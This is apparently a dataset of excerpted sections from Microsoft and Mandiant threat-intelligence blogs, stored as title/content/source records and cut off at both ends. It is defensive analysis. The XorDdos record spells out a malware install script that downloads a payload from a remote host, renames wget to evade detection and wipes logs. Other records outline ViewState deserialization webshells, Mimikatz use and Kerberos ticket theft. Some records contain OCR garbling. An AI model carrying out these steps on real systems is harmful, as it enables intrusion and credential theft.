structure Killing an existing tccd instance Suspicious Directory Services invocations such as dsimport and dsexpor \nBy generically detecting behavior associated with CVE-2020-9934 (that is, dropping a new TCC.db file fires an alert), Defender for Endpoint immediately provided protection against these exploits before the powerdir vulnerability was patched. This is a testament of Defender for Endpoint's capabilities: with strong, intelligent generalization, it will detect similar bypass vulnerabilities discovered in the future. ", "source": "microsoft"}, {"title": "Introduction", "content": "DART was unable to determine the initial entry vector of this attack due to the age of this compromise and limited retention of security solutions, along with encrypted devices being reimaged before analysis. The earliest observed activity showed the actor with domain administrator credentials. ", "source": "microsoft"}, {"title": "Defense", "content": "As we observe more attacks using similar methods as described in this blog, organizations must ensure they follow security practices to defend their servers. The following is a list of recommendations for monitoring that organizations should implement as part of their detection strategy. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Ransomware groups continue to grow in sophistication through the increasing hibernation times before encryption, large varieties of persistent access and the use of legitimate signed binaries. These groups continue to target sensitive data for exfiltration, with some groups returning to the network post-encryption to ensure they maintain a foothold on the network. \nNetworks must remain vigilant hunting for these TTPs and anomalous behaviors. The Cuba ransomware group used a large variety of living of the land techniques to help evade detection by antivirus products. This requires a stronger focus on anomaly and behavioral detections for hunting on a network, rather than standard malicious file detection. Software auditing of remote access tools and remote execution tools, such as PsExec and SSH, should be regularly evaluated. \nMicrosoft strongly recommends focusing on the following actions to help improve your network's security posture: \nEnabling tamper protection on antivirus products.   \nTriage high severity antivirus and EDR alerts within a timely manner, including tampering alerts.   \nEnable MFA and monitoring for administration accounts.   \nMonitoring anomalies in service and scheduled task creation. \nTo understand how Microsoft can help you secure your network and respond to network compromise, visit https://aka.ms/DART. ", "source": "microsoft"}, {"title": "Introduction", "content": "XorDdos propagates primarily via SSH brute force. It uses a malicious shell script to try various root credential combinations across thousands of servers until finding a match on a target Linux device. As a result, we see many failed sign-in attempts on devices successfully infected by the malware: \nOur analysis determined two of XorDdos' methods for initial access. The first method involves copying a malicious ELF file to temporary file storage /dev/shm and then running it. Files written at /dev/shm are deleted during system restart, thus concealing the source of infection during forensic analysis. \nThe second method involves running a bash script that performs the following activities via the command line: \n1. Iterates the following folders to find a writable directory: \n/bin o /home o /root o /tmp /usr /etc \n2. If a writable directory is found, changes the working directory to the discovered writable directory. \n3. Uses the curl command to download the ELF file payload from the remote location hxxp://Ipv4PII_777789ffaa5b68638cdaea8ecfa10b24b326ed7d/1[.]txt and saves the file as  ygljglkjgfg0.   \n4. Changes the file mode to \"executable\".   \n5. Runs the ELF file payload.   \n6. Moves and renames the Wget binary to evade rule-based detections triggered by malicious usage of the Wget binary. In this case, it renames the Wget binary to good and moves the file to the following locations: mv /usr/bin/wget /usr/bin/good mv /bin/wget /bin/good   \n7. Attempts to download the ELF file payload for a second time, now only using the file good and not the Wget binary.   \n8. After running the ELF file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: \nWhichever initial access method is used, the result is the same: the running of a malicious ELF file, which is the XorDdos malware. In the next section, we do a deep dive into the XorDdos payload. \nOther XorDdos variants that we recently saw in our investigations use this bash script installation method to either download or build its rootkit remotely. This installation method differentiates itself by matching the kernel build of the target device with the rootkit available on the attacker's command and control (C2) server. \nAfter enumerating the target device, the script communicates with the attacker's C2 server, and checks if a rootkit that matches the kernel build of the target device exists on the server. If it finds an existing rootkit that matches with the target device, the script downloads the rootkit. The following steps initiate the matching and downloading of the XorDdos malware and rootkit: \n1. The bash script gets the target device's kernel-related information using the following sequence of commands and sends it to the attacker's server: lsmod with tail to get the list of loaded Linux kernel modules Modinfo extracts the vermagic number, a string containing information such as the kernel version number and CPU type used by the kernel module to load into kernel space. The vermagic number is gathered from the listed kernel modules. \n2. The vermagic string is sent to the attacker's server in encoded form. \n3. If the rootkit binary specific to the kernel build exists on the server, it is downloaded along with the XorDdos ELF as a compressed .tar file. 4. The .tar file is further uncompressed in a new directory named after the string obtained by encoding the MD5 hash of the vermagic string and created under the location /tmp on the target device. After the .tar file is uncompressed, the XorDdos ELF malware installs the XorDdos rootkit. \nIf the kernel build of the target device does not match any of the rootkits on the attacker's server, the bash script initiates the following steps to build and compile the rootkit remotely: \n1. The bash script prepares archived Linux kernel headers in the /tmp directory. Linux kernel headers are defining C-language public kernel APIs and data structures to enable compilation of 3rd party kernel modules.   \n2. The bash script downloads and launches the ELF binary uploader in /tmp. This binary uses an HTTP POST request to upload the archived kernel headers to the attacker's server.   \n3. The ELF binary removes the uploader component from /tmp to minimize XorDdos' footprint.   \n4. The uploaded archived kernel headers are used on the C2 server to build and compile the rootkit component. Thus, the newly built rootkit component becomes available for download from the C2 server, also making it available for other future infections.   \n5. The bash script then initiates the prior set of steps to download and install the XorDdos ELF malware, which installs the rootkit into the target device. ", "source": "microsoft"}, {"title": "defend", "content": "XorDdos' modular nature provides attackers with a versatile trojan capable of infecting a variety of Linux system architectures. Its SSH brute force attacks are a relatively simple yet effective technique for gaining root access over a number of potential targets. \nAdept at stealing sensitive data, installing a rootkit device, using various evasion and persistence mechanisms, and performing DDoS attacks, XorDdos enables adversaries to create potentially significant disruptions on target systems. Moreover, XorDdos may be used to bring in other dangerous threats or to provide a vector for follow-on activities. \nXorDdos and other threats targeting Linux devices emphasize how crucial it is to have security solutions with comprehensive capabilities and complete visibility spanning numerous distributions of Linux operating systems. Microsoft Defender for Endpoint offers such visibility and protection to catch these emerging threats with its next-generation antimalware and endpoint detection and response (EDR) capabilities. Leveraging threat intelligence from integrated threat data, including client and cloud heuristics, machine learning models, memory scanning, and behavioral monitoring, Microsoft Defender for Endpoint can detect and remediate XorDdos and its multi-stage, modular attacks. This includes detecting and \nRise in XorDdos: A deeper look at the stealthy DDoS malware targeting Linux devices | Microsoft Security Blog protecting against its use of a malicious shell script for initial access, its drop-andexecution of binaries from a world-writable location, and any potential follow-on activities on endpoints. \nDefenders can apply the following mitigations to reduce the impact of this threat: \nEncourage the use of Microsoft Edge-available on Linux and various platforms-or other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Use device discovery to find unmanaged Linux devices on your network and onboard them to Microsoft Defender for Endpoint. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to use cloud-based machine learning protections that can block a huge majority of new and unknown variants. Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn't detect the threat or when Microsoft Defender Antivirus is running in passive mode. Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet. Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume. \nAs threats across all platforms continue to grow in number and sophistication, security solutions must be capable of providing advanced protection on a wide range of devices, regardless of the operating system in use. Organizations will continue to face threats from a variety of entry points across devices, so Microsoft continues to heavily invest in protecting all the major platforms and providing extensive capabilities that organizations needed to protect their networks and systems. ", "source": "microsoft"}, {"title": "Introduction", "content": "April update \nNews Threat intelligence Microsoft Defender Vulnerabilities and exploits \n7 min read \nThe evolution of Microsoft Threat Protection, April update \nBy Microsoft Security Team \nMicrosoft Threat Protection continues to energize the threat protection market with our most recent announcements. Customers are excited about the launch of Microsoft Defender Advanced Threat Protection (ATP), which extends Microsoft's best in class endpoint security to Mac and adds powerful new capabilities of Threat and Vulnerability Management. \nReal-time endpoint protection, plus detection and response (EDR) insights across Windows and Mac, correlated with endpoint vulnerabilities. Invaluable vulnerability and misconfiguration context during incident investigations on machine or organization level. \nBuilt-in remediation processes through a tight integration with Microsoft Intune and Microsoft System Center Configuration Manager. \nWe're committed to maintaining this pace of innovation as we continue our journey towards our ideal vision of Microsoft Threat Protection. \nWatch Rob Lefferts deliver an update on the latest enhancements: \nThis strong vision can only be built on a solid foundation. We want to share the details of this foundation, which enables Microsoft Threat Protection to deliver a powerful, effective, and unique threat protection solution to customers. ", "source": "microsoft"}, {"title": "Protection", "content": "Take a moment to learn more about Microsoft Threat Protection, read our previous monthly updates, and visit our website. \nOrganizations have already transitioned to Microsoft Threat Protection and partners are leveraging its powerful capabilities. Begin a trial of Microsoft Threat Protection services today to experience the benefits of the most comprehensive, integrated, and secure threat protection solution for the modern workplace. ", "source": "microsoft"}, {"title": "Introduction", "content": "Imagine this work-from-home scenario for an executive assistant (EA): \nIt's a typical day at work for you as a remote EA. You prepare your to-do list for the day and check your CEO's calendar for their scheduled meetings, all while communicating with other EAs via email and chat. You categorize your emails and prioritize your tasks-nothing out of the ordinary. \nIn the middle of the workday, you get an email appearing to come from your boss, requesting that you purchase gift cards to give to the team as an incentive for their hard work during the pandemic. \nThe request seems a little strange, you think. Maybe it was a spur-of-the-moment initiative. But you're a rock star assistant and decide to go ahead and purchase the gift cards using department funds. \nYou reply to your boss's email with the gift card codes. After a while of not hearing back, you finally ping them on chat to make sure they received them. Your boss expresses their confusion in response to your chat message\u2013they never requested gift cards for the team. \nThis is a classic business email compromise (BEC) scenario. ", "source": "microsoft"}, {"title": "Introduction", "content": "In brand impersonation attacks, an email or a website is designed to appear visually identical to a known legitimate brand, like Microsoft 365 or LinkedIn, but the domain-to which user-inputted information, like passwords or credit card details, is sent-is actually controlled by an attacker. Examples of a malicious sign-in page impersonating Microsoft is shown in Figure 1. \nAny vision-based system, computer or human, that detects brand impersonation attacks must take a two-step approach upon receiving content: \n1. Determine whether the content looks like content from a known brand, and if so, which brand   \n2. Determine if other artifacts associated with the content (such as URLs, domain names, or certificates) match those used by the identified brand \nFor example, if a brand impersonation detection system sees an image that appears to come from Microsoft but also notices that the URL is indeed from Microsoft and that the certificate matches a known certificate issued to Microsoft, then the content would be classified as legitimate. \nHowever, if the detector encounters content which shares visual characteristics with legitimate Microsoft content like in Figure 1, but then notices that the URL associated with the content is an unknown or unclassified URL with a suspicious certificate, then the content would be flagged as a brand impersonation attack. ", "source": "microsoft"}, {"title": "Introduction", "content": "In a nutshell, macOS apps can specify sandbox rules for the operating system to enforce on themselves. The App Sandbox restricts system calls to an allowed subset, and the said system calls can be allowed or disallowed based on files, objects, and arguments. Simply put, the sandbox rules are a defense-in-depth mechanism that dictates the kind of operations an application can or can't do, regardless of the type of user running it. Examples of such operations include: \nthe kind of files an application can or can't read or write;   \nwhether the application can access specific resources such as the camera or the microphone, and;   \nwhether the application is allowed to perform inbound or outbound network connections. \nTherefore, the App Sandbox is a useful tool for all macOS developers in providing baseline security for their applications, especially for those that have large attack surfaces and run user-provided code. One example of these applications is Microsoft Office. ", "source": "microsoft"}, {"title": "defend", "content": "Since our initial discovery of leveraging Launch Services in macOS for generic sandbox escapes, we have been using our POC exploits in Red Team operations to emulate end-to-end attacks against Microsoft Defender for Endpoint, improve its capabilities, and challenge our detections. Shortly after our Red Team used our first POC exploit, our Blue Team members used it to train artificial intelligence (AI) models to detect our exploit not only in Microsoft Office but also on any app used for a similar Launch Services-based sandbox escape. \nAfter we learned of Perception Point's technique and created our own new exploit technique (the Python POC), our Red Team saw another opportunity to fully test our own detection durability. Indeed, the same set of detection rules that handled our first sandbox escape vulnerability still turned out to be durable-even before the vulnerability related to our second POC exploit was patched. \nFor Defender for Endpoint customers, such detection durability feeds into the product's threat and vulnerability management capabilities, which allows them to quickly discover, prioritize, and remediate misconfigurations and vulnerabilities- including those affecting non-Windows devices-through a unified security console. \nLearn how Microsoft Defender for Endpoint delivers a complete endpoint security solution across all platforms. ", "source": "microsoft"}, {"title": "Introduction", "content": "OpenVPN is a virtual private network (VPN) system that creates a private and secure point-to-point or site-to-site connection between networks. The OpenVPN open-source project is widely popular across the world, including the United States, India, France, Brazil, the United Kingdom, and Germany, as well as industries spanning the information technology, financial services, telecommunications, and computer software sectors. This project supports different major platforms and is integrated into millions of devices globally. \nOpenVPN is also the name of the tunneling protocol it uses, which employs the Secure Socket Layer (SSL) encryption protocol to ensure that data shared over the internet remains private, using AES-256 encryption. Since the source code is available for audit, vulnerabilities can be easily identified and fixed. ", "source": "microsoft"}, {"title": "Introduction", "content": "Light \nBlog home / The Importance of the \"Fvaluated ConfiguAHtMicrpsefmmon Criteria Evaluations Products \nHow many of you have heard of the Common Criteria ?  If you've ever done security work with government, you probably have.  If not, then possibly not.  Either way, read on and I'll give you my own view, including some of the barnacles clinging to the hull of the general program. ", "source": "microsoft"}, {"title": "Introduction", "content": "One well-known operating system that uses D-Bus is ChromeOS. ChromeOS is a Google-proprietary Linux-based operating system that runs on Chromebooks, Chromeboxes, Chromebits and Chromebases. ChromeOS is a closed-source system with open-source components that are derived from ChromiumOS, and the operating system uses Google's own Chrome browser as its principal user interface. \nIn terms of security, ChromeOS is well hardened; some of the security features on ChromeOS include: \nHardened sandbox (called minijail)   \nVerified boot   \nLocked-down filesystem (mounted with noexec, nosuid, nodev) and dm-verity   \nRoot user restrictions (SECURE_NOROOT)   \nWhen development mode is entered, all locally stored data is wiped \nAs with other modern browsers, exploiting ChromeOS usually requires chaining vulnerabilities together. Due to hardening measures in ChromeOS, discovering vulnerabilities became a specific niche and, therefore, the number of public vulnerabilities is quite low compared to other operating systems. ChromeOS vulnerabilities generally fall into one of three different classes: \n1. ChromeOS-specific logic vulnerabilities   \n2. ChromeOS-specific memory-corruption vulnerabilities   \n3. Broader threats such as Chrome browser vulnerabilities \nIn this case, the discovered vulnerability falls under the second class, ChromeOSspecific memory-corruption vulnerabilities. ", "source": "microsoft"}, {"title": "Introduction", "content": "Research Threat intelligence Attacker techniques, tools, and infrastructure \n5 min read \nRecommendations for deploying the latest Attack surface reduction rules for maximum impact \nBy Microsoft Threat Intelligence \nFebruary 22, 2019 \nXB \nAttacker techniques, tools, and infrastructure \nThe keystone to good security hygiene is limiting your attack surface. Attack surface reduction is a technique to remove or constrain exploitable behaviors in your systems. In this blog, we discuss the two attack surface reduction rules introduced in the most recent release of Windows and cover suggested deployment methods and best practices. \nSoftware applications may use known, insecure methods, or methods later identified as useful for malware exploits. For example, macros are an old and powerful tool for task automation. However, macros can spawn child processes, invoke the Windows API, and perform other tasks which render them exploitable by malware. \nWindows Defender Advanced Threat Protection (Windows Defender ATP) enables you to take advantage of attack surface reduction rules that allow you to control exploitable threat vectors in a simple and customizable manner. In previous releases of Windows we launched rules that let customers disallow remote process creation through WMI or PSExec and block Office applications from creating executable content. Other rules include the ability to disable scripts from creating executable content or blocking file executions unless age and prevalence criteria are met. \nThe latest attack surface reduction rules in Windows Defender ATP in latest re based on system and application vulnerabilities uncovered by Microsoft and other security companies. Below we describe that these rules do. More importantly, we outline recommendations for deploying these rules in enterprise environments. ", "source": "microsoft"}, {"title": "Introduction", "content": "Light \n\ue80f Blog home / Threat intelligence All Microsoft\ue70d Products\ue70d \nSearch the blog \nResearch Threat intelligence Microsoft Defender Attacker techniques, tools, and infrastructure \n22 min read \nNew XCSSET malware adds new obfuscation, persistence techniques to infect Xcode projects \nBy Microsoft Threat Intelligence ", "source": "microsoft"}, {"title": "Introduction", "content": "The Adrozek malware is installed on devices through drive-by download. In our tracking of the Adrozek campaign from May to September 2020, we saw 159 unique domains used to distribute hundreds of thousands of unique malware samples. Attackers relied heavily on polymorphism, which allows attackers to churn huge volumes of samples as well as to evade detection. \nWhile many of the domains hosted tens of thousands of URLs, a few had more than 100,000 unique URLs, with one hosting almost 250,000. This massive infrastructure reflects how determined the attackers are to keep this campaign operational. \nThe distribution infrastructure is also very dynamic. Some of the domains were up for just one day, while others were active for longer, up to 120 days. Interestingly, we saw some of the domains distributing clean files like Process Explorer, likely an attempt by the attackers to improve the reputation of their domains and URLs, and evade network-based protections. ", "source": "microsoft"}, {"title": "defend", "content": "Adrozek shows that even threats that are not thought of as urgent or critical are increasingly becoming more complex. And while the malware's main goal is to inject ads and refer traffic to certain websites, the attack chain involves sophisticated behavior that allow attackers to gain a strong foothold on a device. The addition of credential theft behavior shows that attackers can expand their objectives to take advantage of the access they're able to gain. \nThese complex behaviors, and the fact that the campaign uses polymorphic malware, require protections that focus on identifying and detecting malicious behavior. Microsoft Defender Antivirus, the built-in endpoint protection solution on Windows 10, uses behavior-based, machine learning-powered detections to block Adrozek. \nEnd users who find this threat on their devices are advised to re-install their browsers. Considering the massive infrastructure that was used to distribute this threat on the web, users should also educate themselves about preventing malware infections and the risks of downloading and installing software from untrusted sources and clicking ads or links on suspicious websites. Users should also take advantage of URL filtering solutions, such as Microsoft Defender SmartScreen on Microsoft Edge. Configuring security software to automatically download and \nWidespread malware campaign seeks to silently inject ads into search results, affects multiple browsers | Microsoft Security Blog install updates, as well as running the latest versions of the operating system and applications and deploying the latest security updates help harden endpoints from threats. \nFor enterprises, defenders should look to reduce the attack surface for these types of threats. Application control allows organizations to enforce the use of only authorized apps and services. Enterprise-grade browsers like Microsoft Edge provide additional security features like conditional access and Application Guard that defend against threats on the browser. \nIt's also important for enterprises to gain deep visibility into malicious behaviors on endpoints and the capability to correlate with threat data from other domains like cloud apps, email and data, and identities. Microsoft 365 Defender delivers coordinated protection across domains and provides rich investigation tools that empower defenders to respond to attacks. Learn how your organization can stop attacks through automated, cross-domain security and built-in AI with Microsoft Defender 365. \nMicrosoft 365 Defender Research Team ", "source": "microsoft"}, {"title": "Conclusion", "content": "In its mildest scenario, disassembled junk code can waste your time and effort. In its worst scenario, it \n2025/5/7 11:35 \ncan make you say things about the data you're analyzing that aren't true. In this post, we have learned to spot disassembled junk by recognizing and understanding out-of-place code. We broke the out-of-place code down into categories for the most common cases and discussed what they mean, why they occur frequently, and why they shouldn't. By learning these indicators, you can easily spot disassembled junk and save yourself time and maintain your reputation. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "FLARE's FakeNet-NG tool is a powerful networksimulation tool available for Windows and Linux. The new content-based protocol detection and SSL detection features ensure that FakeNet-NG remains the most useful tool for malware analysts. Configuration options give programmers the flexibility necessary to respond to malware using most protocols on any port. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Targeting", "content": "Google's Workspace Trust and Safety team also observed a two-step phishing campaign targeting staff and students. First, attackers send a phishing email to faculty and staff. The emails are designed to entice faculty and staff to provide their login credentials in order to view a document about a raise or bonus. \nhishing Campaigns Targeting Higher Education Institutions | Google Cloud Blog \nNext, attackers use login credentials provided by faculty and staff to hijack their account and email phishing forms to students. These forms are designed to look like job applications, and phish for personal and financial information. ", "source": "mandiant"}, {"title": "Conclusion", "content": "As older ANDROMEDA malware continues to spread from compromised USB devices, these re-registered domains pose a risk as new threat actors can take control and deliver new malware to victims. This novel technique of claiming expired domains used by widely distributed, financially motivated malware can enable follow-on compromises at a wide array of entities. Further, older malware and infrastructure may be more likely to be overlooked by defenders triaging a wide variety of alerts. \nThis is Mandiant's first observation of suspected Turla targeting Ukrainian entities since the onset of the invasion. The campaign's operational tactics appear consistent with Turla's considerations for planning and advantageous positioning to achieve initial access into victim systems, as the group has leveraged USBs and conducted extensive victim profiling in the past. In this case, the extensive profiling achieved since January possibly allowed the group to select specific victim systems and tailor their follow-on exploitation efforts to gather and exfiltrate information of strategic importance to inform Russian priorities. However, we note some \nelements of this campaign that appear to be a departure from historical Turla operations. Both KOPILUWAK and QUIETCANARY were downloaded in succession at various times, which may suggest the group was operating with haste or less concern for operational security, experiencing some aspect of operational deficiency, or using automated tools. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant is currently tracking four distinct uncategorized (UNC) groups involved in exploiting this vulnerability. We have observed some lower degrees of confidence overlaps in post-exploitation stages among these UNC groups, like using the same recon commands and utilities available on Windows. The common tools observed across multiple intrusions were: \ncsvde.exe certutil.exe local.exe nbtscan.exe \nTwo threat clusters used Mimikatz for dumping process memory. Notably, there were no overlaps in infrastructure between these clusters of activity. The exploits were sourced from different VPN provider IP addresses and previously compromised third-party devices. ", "source": "mandiant"}, {"title": "Overview", "content": "Figure 2 illustrates the overall process that starts with analyzing the content of a tweet and concludes with two forecasting evaluations. First, we run Named Entity Recognition (NER) on tweet contents to extract named entities. Second, we use two \nclassifiers to test the relevancy and severity towards the pre-identified entities. Finally, we match the relevant and severe tweets to the corresponding CVE. \nEach tweet is associated to CVEs by inspecting URLs or the contents hosted at a URL. Specifically, we link a CVE to a tweet if it contains a CVE number in the message body, or if the URL content contains a CVE. Each tweet must be associated with a single CVE and must be classified as relevant to securityrelated topics to be scored. The first forecasting task considers how well our model can predict the CVSS rankings ahead of time. The second task is predicting future exploitation of the vulnerability for a CVE based on Symantec Antivirus Signatures and Exploit DB. The rationale is that eventual presence in these lists indicates not just that exploits can exist or that they do exist, but that they also are publicly available. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Preventing vulnerabilities is critical to an organization's information security posture, as it effectively mitigates some cyber security breaches. In our work, we found that social media content that pre-dates CVE scoring releases can be effectively used by machine learning models to forecast vulnerability scores and prioritize vulnerabilities days before they are made available. Our approach incorporates a novel social sentiment component, which CVE scores do not, and it allows scores to better predict real-world exploitation of vulnerabilities. Finally, our approach allows for a more practical prioritization of software vulnerabilities effectively indicating the few that are likely to be weaponized by attackers. NIST has acknowledged that the current CVSS methodology is insufficient. The current process of scoring CVSS is expected to be replaced by ML-based solutions by October 2019, with limited human involvement. However, there is no indication of utilizing a social component in the scoring effort. \nThis work was led by researchers at Ohio State under the IARPA CAUSE program, with support from Leidos and FireEye. This work was originally presented at NAACL in June 2019, our paper describes this work in more detail and was also covered by Wired. ", "source": "mandiant"}, {"title": "Conclusion", "content": "RATs are widely used for legitimate purposes, often by system administrators. However, since they are legitimate applications and readily available, malware authors can easily abuse them and sometimes can avoid user suspicion as well. \nFake Software Update Abuses NetSupport Remote Access Tool | Mandiant | Google Cloud Blog The FireEye HX Endpoint platform successfully detects this attack at the initial phase of the attack cycle. ", "source": "mandiant"}, {"title": "Targeting", "content": "In June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal vulnerability specifically to read the web.config file for a vulnerable web application on a victim web server. APT41 then used the machineKey values from the web.config file to generate a malicious ViewState payload for a deserialization exploit. Mandiant did not identify how APT41 originally obtained the machineKey values for the proprietary application exploited in May 2021 or the USAHerds application, which was first exploited in July 2021. However, it is likely that APT41 obtained the web.config file through similar means. \nTo craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET. In order to successfully load arbitrary .NET assemblies into memory, APT41 set the   \nDisableActivitySurrogateSelectorTypeCheck   \nproperty flag to true within the   \nConfigurationManager.AppSettings class of the running application via the ViewState payload. APT41 subsequently loaded .NET assemblies into memory using additional YSoSerial payloads configured to write webshells to a hardcoded filepath on disk. \nFigure 4 shows an example JScript webshell deployed through a malicious ViewState object by APT41 which utilizes Code Page 936 for the Chinese Simplified keyboard language. \nFor additional information regarding deserialization exploits and our new hunting rule generation tool 'HeySerial', read our blog post, Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we discussed how Speakeasy can be effective at automatically identifying rootkit \n2025/5/7 11:13 \nEmulation of Kernel Mode Rootkits With Speakeasy | Mandiant | Google Cloud B activity from the kernel mode binary. Speakeasy can be used to quickly triage kernel binaries that may otherwise be difficult to dynamically analyze. For more information and to check out the code, head over to our GitHub repository. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Overview", "content": "The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails. Although the contents of the malicious documents are unreadable (see Figure 3), the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs). \nFor the North Korean lure, a news article with an identical title was readily available online. It's also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese. The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018. Figure 1 shows the screenshot of the event page. ", "source": "mandiant"}, {"title": "Conclusion", "content": "While APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving. In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor's network communications. This shows that APT10 is very capable of maintaining and updating their malware. \nTo mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources. FireEye MultiVector Execution (MVX) engine is able to recognize and block this threat with the following detection names: \nAPT.Backdoor.Win.UPPERCUT FE_APT_Backdoor_Win32_UPPERCUT \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "By obtaining privileged access to a domain-joined Linux system, it is often possible to scrape Kerberos tickets useful for lateral movement. Although it is still common to find these tickets in the /tmp directory, it is now possible to also scrape these tickets from modern Linux systems that utilize the SSSD KCM. \nWith the right Kerberos tickets, it is possible to move laterally to the rest of the Active Directory domain. If a privileged user authenticates to a compromised Linux system (such as a Domain Admin) and leaves a ticket behind, it would be possible to steal that \nuser's ticket and obtain privileged rights in the Active Directory domain. ", "source": "mandiant"}, {"title": "Appendix", "content": "To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP. \nThere are two main types of Kerberos ticket types used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a domainjoined system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller. \nWhen the user wants to authenticate to the remote file share, Windows first checks if a valid TGT is present in memory on the user's workstation. If a TGT isn't present, a new TGT is requested from the Domain Controller in the form of an AS-REQ request. To prevent password cracking attacks AS\nREP Roasting, by default, Kerberos   \nPreauthentication is performed first. Windows   \ncreates a timestamp and encrypts the timestamp with the user's Kerberos key (Note: User Kerberos keys vary based on encryption type. In the case of RC4 encryption, the user's RC4 Kerberos key is directly derived from the user's account password. In the case of AES encryption, the user's Kerberos key is derived from the user's password and a salt based on the username and domain name). The domain controller receives the request and decrypts the timestamp by looking up the user's Kerberos key. An example AS-REQ packet is shown in Figure 5. \nOnce preauthentication is successful, the Domain Controller issues an AS-REP response packet that contains various metadata fields, the TGT itself, and an \"Authenticator\". The data within the TGT itself is considered sensitive. If a user could freely modify the content within the TGT, they could impersonate any user in the domain as performed in the Golden Ticket attack. To prevent this from easily occurring, the TGT is encrypted with the long term Kerberos key stored on the Domain Controller. This key is derived from the password of the krbtgt account in Active Directory. \nTo prevent users from impersonating another user with a stolen TGT blob, Active Directory's Kerberos implementation uses session keys that are used for mutual authentication between the user, domain, and service. When the TGT is requested, the Domain Controller generates a session key and places it in two places: the TGT itself (which is encrypted with the krbtgt key and unreadable by the end user), and in a separate structure called the Authenticator. The Domain Controller encrypts the Authenticator with the user's personal Kerberos key. \nWhen Windows receives the AS-REP packet back from the domain controller, it caches the TGT ticket data itself into memory. It also decrypts the Authenticator with the user's Kerberos key and obtains a copy of the session key generated by the Domain Controller. Windows stores this session key in memory for future use. At this point, the user's system has a valid TGT that it can use to request service tickets from the domain controller. An example AS-REP packet is shown in Figure 6. \nAfter obtaining a valid TGT for the user, Windows requests a service ticket for the file share service hosted on the remote system   \nSQLSERVER.ACMENET.CORP. The request is made using the service's Service Principal Name (\"SPN\"). In this case, the SPN would be   \ncifs/SQLSERVER.ACMENET.CORP. Windows builds the service ticket request in a TGS-REQ packet. Within the TGS-REQ packet, Windows places a copy of the TGT previously obtained from the Domain Controller. This time, the Authenticator is encrypted with the TGT session key previously obtained from the domain controller. An example TGS-REQ packet is shown in Figure 7. \nOnce the Domain Controller receives the TGS-REQ packet, it extracts the TGT from the request and decrypts it with the krbtgt Kerberos key. The Domain Controller verifies that the TGT is valid and extracts the session key field from the TGT. The Domain Controller then attempts to decrypt the Authenticator in the TGS-REQ packet with the session key. Once decrypted, the Domain Controller examines the Authenticator and verifies the contents. If this operation succeeds, the user is considered authenticated by the Domain Controller and the requested service ticket is created. \nThe Domain Controller generates the service ticket requested for cifs/SQLSERVER.ACMENET.CORP. The data within the service ticket is also considered sensitive. If a user could manipulate the service ticket data, they could impersonate any user on the domain to the service as performed in the Silver Ticket attack. To prevent this from easily happening, the Domain Controller encrypts the service ticket with the Kerberos key of the computer the user is \nauthenticating to. All domain-joined computers in Active Directory possess a randomly generated computer account credential that both the computer and Domain Controller are aware of. The Domain Controller also generates a second session key specific to the service ticket and places a copy in both the encrypted service ticket and a new Authenticator structure. This Authenticator is encrypted with the first session key (the TGT session key). The service ticket, Authenticator, and metadata are bundled in a TGS-REP packet and forwarded back to the user. An example TGS-REP packet is shown in Figure 8. \nOnce Windows receives the TGS-REP for cifs/SQLSERVER.ACMENET.CORP, Windows extracts the service ticket from the packet and caches it into memory. It also decrypts the Authenticator with the TGT specific session key to obtain the new service specific session key. Using both pieces of \ninformation, it is now possible for the user to authenticate to the remote file share. Windows negotiates a SMB connection with SQLSERVER.ACMENET.CORP. It places a Kerberos blob in an \"ap-req\" structure. This Kerberos blob includes the service ticket received from the domain controller, a new Authenticator structure, and metadata. The new Authenticator is encrypted with the service specific session key that was previously obtained from the Domain Controller. The authentication process is shown in Figure 9. \nOnce the file share server receives the authentication request, it first extracts and decrypts the service ticket from the Kerberos authentication blob and verifies the data within. It also extracts the service specific session key from the service ticket and attempts to decrypt the Authenticator with it. If this operation succeeds, the user is considered to be authenticated to the service. The server will \nacknowledge the successful authentication by sending one final Authenticator back to the user, encrypted with the service specific session key. This action completes the mutual authentication process. The response (contained within an \"aprep\" structure) is shown in Figure 10. \nA diagram of the authentication flow is shown in Figure 11 ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant assesses with moderate confidence that UNC5221 is a China-nexus espionage threat actor. Mandiant has observed UNC5221 targeting a wide range of verticals of strategic interest to the People's Republic of China (PRC) both pre and post 